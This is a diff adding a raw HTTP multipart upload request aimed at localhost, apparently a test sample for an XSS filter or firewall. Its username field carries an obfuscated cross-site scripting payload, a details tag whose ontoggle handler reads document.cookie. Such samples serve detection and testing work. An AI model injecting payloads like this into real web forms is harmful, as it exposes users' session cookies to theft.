@@ -1,0 +1,14 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: en
+User-Agent: MQQBrowser/359.68 (Windows 3.1; Linux 2.1; 360SE 4.8) (KHTML, like Gecko) 9.7
+Connection: close
+Content-Type:multipart/form-data; boundary=----ZCMNerFvCybWYjDGrZRDndQYWn
+Content-Length: 231
+
+------ZCMNerFvCybWYjDGrZRDndQYWn
+Content-Disposition: form-data; name=\"username\";
+
+<details open=5556 ont<oggle=\"al``\"ontoggle=alert(document.cookie)>
+------ZCMNerFvCybWYjDGrZRDndQYWn--
